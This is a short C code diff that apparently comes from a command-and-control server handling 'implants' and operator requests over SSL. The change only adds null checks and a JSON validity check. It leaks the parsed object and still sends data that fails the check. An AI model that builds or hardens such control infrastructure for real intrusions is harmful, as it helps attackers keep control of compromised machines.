@@ -106,6 +106,9 @@ char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
     }
 
     cJSON *implant_id = cJSON_GetObjectItem(rinfo, "implant_id");
+    if (!implant_id) {
+        return NULL;
+    }
     cJSON *action = cJSON_GetObjectItem(rinfo, "action");
 
     if (!action || !cJSON_IsString(action) || !implant_id || !cJSON_IsString(implant_id)) {
@@ -214,10 +217,16 @@ void *operator_handler(void *Args) {
         if (strncmp(about->valuestring, "Implants", 8) == 0){ // all info about implants
             char *implants = GetData(con, "Implants");
             //send(sock, agents, strlen(agents), 0);
-            //if (implants == NULL) {
-            //    // handle this
-            //    continue;
-            //    }
+            if (implants == NULL) {
+                // handle this
+                continue;
+                }
+            // make sure that json is fine
+            cJSON *re = cJSON_Parse(implants);
+            if (!re) {
+                log_message(LOG_ERROR, "Invalid JSON FROM Implants database");
+            }
+
             
             SSL_write(ssl, implants, strlen(implants));
             free(implants);
